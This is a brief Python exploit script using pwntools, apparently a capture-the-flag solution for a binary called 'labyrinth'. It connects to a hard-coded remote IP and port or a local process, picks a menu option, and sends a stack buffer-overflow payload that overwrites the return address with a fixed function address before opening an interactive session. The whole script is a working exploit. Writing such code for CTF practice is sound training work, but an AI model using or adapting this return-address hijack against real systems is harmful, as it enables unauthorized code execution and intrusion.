#!/usr/bin/env python3

import time

from pwn import *
from pwn import p64

host = "142.93.38.14:31134"

if args.REMOTE:
    ip, port = host.split(":")
    p = remote(ip, port)
else:
    p = process("./labyrinth")

if args.GDB:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x4015da
    b *0x4012ab
    c
    """)

payload = b"A" * 0x38
payload += p64(0x401256) + b"\n"
# payload += p64(0x4013ae) + b"\n"

p.sendafter(b">> ", b"69\n")
p.sendafter(b">> ", payload)
p.interactive()
